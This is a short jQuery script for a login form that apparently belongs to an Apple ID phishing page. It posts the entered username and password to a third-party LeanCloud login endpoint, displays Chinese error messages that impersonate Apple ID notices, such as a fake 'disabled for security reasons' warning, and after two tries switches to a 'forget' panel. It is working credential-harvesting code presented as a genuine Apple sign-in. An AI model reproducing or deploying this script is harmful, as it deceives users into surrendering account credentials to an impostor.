$(function() {
	var inputs = $("input[type!=submit]");
	var text = $("#username");
	var password = $("#password");
	inputs.focus(function() {
		$(this).css("color", "#CCCCD3")
	});
	inputs.blur(function() {
		$(this).css("color", "#797975")
	})
	$("#loginform").submit(function() {
		//前端验证
		if(text.val() == "" || (text.val() == "" && password.val() == "")) {
			$(".coherent_id_6").css("display", "block");
			text.addClass("kongbg");
			password.addClass("kongbg");
			return false;
		} else {
			$(".coherent_id_6").css("display", "none");
			text.removeClass("kongbg");
			password.removeClass("kongbg");
		}
		if(password.val() == "" || (text.val() == "" && password.val() == "")) {
			$(".coherent_id_7").css("display", "block");
			text.addClass("kongbg");
			password.addClass("kongbg");
			return false;
		} else {
			$(".coherent_id_7").css("display", "none");
			text.removeClass("kongbg");
			password.removeClass("kongbg");
		}
		//后端数据验证
		var username = $("#username").val();
		var pwd = $("#password").val();
		$.ajax({
			type: "post",
			url: "https://api.leancloud.cn/1.1/login",
			headers: headersobj,
			contentType: "application/json",
			data: '{"username":"' + username + '","password":"' + pwd + '"}',
			success:function(data){
				$("#errtxt").css("display","none");
				location.href='index.html';
			},
			error:function(er){
			var  a=er.responseText;
			var  msg=JSON.parse(a);
			var  errornum=msg.code;
			var  errmmsg=$("#errtxt");
			var  reg=/^(\w)+@\w+\.(com)$/g;
			var  username=$("#username").val();
			 errmmsg.css("display","block");
			 if(reg.test(username)==false){
			 	 errmmsg.val("此 Apple ID 已由于安全原因被禁用,请 重新设置您的账户。");
			 }
			 else if(errornum==211){
			  	 errmmsg.val("您的 Apple ID或密码输入有误。");
			  }
			 else{
			 	 errmmsg.val("您的 Apple ID或密码输入有误。");
			 }
			
			}
			});
		return false;
	});
	var storagelength = 0;
	$("#submitbtn").click(function() {
		localStorage.setItem(storagelength, $("#username").val());
		storagelength++;
		if(storagelength == 2) {
			$("#forget").css("display","block");
		    $("#loginform").css("display","none");
		}
	});
	$(".clearStorage").click(function() {
		storagelength = 0;
		$("#forget").css("display","none");
		$("#loginform").css("display","block");
		for(var i = 0; i < localStorage.length; i++) {
			localStorage.clear(localStorage);
		}
		$("#errtxt").css("display","none");
	});
});